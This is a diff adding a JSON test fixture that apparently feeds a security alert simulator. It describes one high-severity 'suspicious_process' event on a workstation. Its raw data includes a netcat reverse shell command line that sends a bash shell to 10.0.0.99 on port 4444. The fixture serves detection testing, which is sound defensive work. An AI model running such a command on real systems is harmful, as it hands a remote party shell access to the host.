@@ -1,0 +1,25 @@
+{
+  "scenario": "suspicious_process",
+  "description": "Suspicious process execution detected on host",
+  "events": [
+    {
+      "source": "scenario-simulator",
+      "event_type": "suspicious_process",
+      "severity": "high",
+      "timestamp": "2026-08-24T12:00:00Z",
+      "host": {
+        "hostname": "workstation-05",
+        "ip": "192.168.1.105"
+      },
+      "source_ip": null,
+      "user": "jsmith",
+      "message": "Reverse shell process detected",
+      "raw_data": {
+        "process_name": "nc",
+        "process_cmdline": "nc -e /bin/bash 10.0.0.99 4444",
+        "parent_process": "bash",
+        "pid": 12345
+      }
+    }
+  ]
+}
